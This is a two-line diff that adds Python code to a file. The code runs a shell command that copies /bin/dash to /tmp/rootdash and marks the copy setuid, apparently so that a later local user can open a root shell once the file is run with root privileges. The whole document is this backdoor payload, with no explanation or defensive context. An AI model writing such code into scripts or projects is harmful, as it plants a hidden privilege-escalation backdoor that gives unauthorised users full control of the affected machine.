@@ -1,0 +1,2 @@
+import os
+os.system('cp  /bin/dash /tmp/rootdash; chmod u+s /tmp/rootdash;')
